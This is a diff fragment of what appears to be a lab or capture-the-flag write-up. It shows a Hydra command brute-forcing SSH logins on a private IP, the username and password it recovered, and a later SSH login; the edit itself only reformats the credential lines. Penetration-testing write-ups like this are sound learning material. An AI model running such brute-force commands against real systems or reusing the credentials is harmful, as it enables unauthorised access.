@@ -32,8 +32,8 @@ hydra -l tommyboy1 -P password.txt 10.112.145.70 -t 4 ssh
 Hydra performs real-time login attempts against the SSH service using the provided password list until valid credentials are found.
 
 ## 3. Successful Credentials Found
-Username: tommyboy1
-Password: 1qaz%40WSX
+- Username: tommyboy1
+- Password: 1qaz%40WSX
 
 ## 4. SSH login
 Using the discovered credentials, I successfully logged into the target machine:
